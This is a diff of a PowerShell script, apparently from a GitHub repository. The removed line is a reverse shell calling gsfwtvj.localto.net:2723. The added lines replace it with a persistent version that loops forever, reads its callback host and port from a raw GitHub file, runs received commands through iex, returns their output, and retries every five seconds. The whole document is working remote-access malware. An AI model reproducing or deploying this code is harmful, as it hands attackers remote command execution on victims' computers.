@@ -1,1 +1,15 @@
-$client = New-Object System.Net.Sockets.TCPClient('gsfwtvj.localto.net',2723);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+while(1){
+try{
+$url='https://raw.githubusercontent.com/4kr4m0/ps/refs/heads/main/connect.txt'
+$scriptContent = Invoke-WebRequest -Uri $url
+$content = $scriptContent -split "`n"
+$co = $content[0]
+$port = $content[1]
+$client = New-Object System.Net.Sockets.TCPClient($co,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+}
+catch{
+write-host "retry connection"
+Start-Sleep -Seconds 5
+continue
+}
+}
